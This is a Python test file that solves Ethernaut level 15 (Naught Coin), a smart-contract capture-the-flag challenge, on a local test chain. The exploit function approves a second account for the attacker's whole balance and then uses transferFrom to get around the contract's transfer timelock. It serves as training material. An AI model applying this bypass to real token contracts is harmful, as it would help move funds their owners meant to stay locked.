from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv15_naught_coin import NaughtCoin


@default_chain.connect()
def test_lv15():
    
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv15()
    exploit_lv15(contract, ethernaut.attacker, ethernaut.other_account)
    ethernaut.check_lv15(contract)

def exploit_lv15(contract: NaughtCoin, attacker: Account, other_account: Account):
    # Attack vector:
    # Training:
    
    contract.approve(
        spender=other_account,
        value_=contract.balanceOf(attacker.address),
        from_=attacker
    )
    
    contract.transferFrom(
        attacker.address,
        other_account.address,
        contract.balanceOf(attacker.address),
        from_=other_account
    )


